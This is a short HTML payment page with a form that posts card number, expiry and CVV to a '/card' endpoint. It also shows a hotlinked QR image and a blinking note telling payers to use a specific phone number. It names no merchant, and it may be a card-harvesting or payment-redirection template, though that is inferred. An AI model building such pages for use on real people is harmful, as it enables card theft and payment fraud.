<!DOCTYPE html>
<html>
<head>
    <title>Payment Page</title>
    <link rel="stylesheet" href="pay.css">
</head>
<body>
    <div class="payment-container">
        <h1>Make a Payment</h1><br><br>
        <form id="payment-form" action="/card" method="post">
            <label for="card">Card Number:</label>
            <input type="number" id="card" name="card" placeholder="1234 5678 9012 3456" required>
            <label for="expiry">Expiry Date:</label>
            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" placeholder="123" required>
             <button type="submit">Pay Now</button>
        </form>
        <div class="qr-code-scanner">
            <label for="qr-code">Scan QR Code:</label>
           
            <img style="width: 200px;height: 300px;"  src="https://cdn4.sharechat.com/phonepeQRCode_4173df_1601913362233_sc_cmprsd_40.jpg?tenant=sc&referrer=pwa-sharechat-service&f=rsd_40.jpg" alt="QR">
        
            <P class="blink"><u>Note:</u>For paying use this Number 6281248508</P>
            <input type="file" id="qr-code" accept="image/*" capture="environment">
        </div>
    </div>
</html>
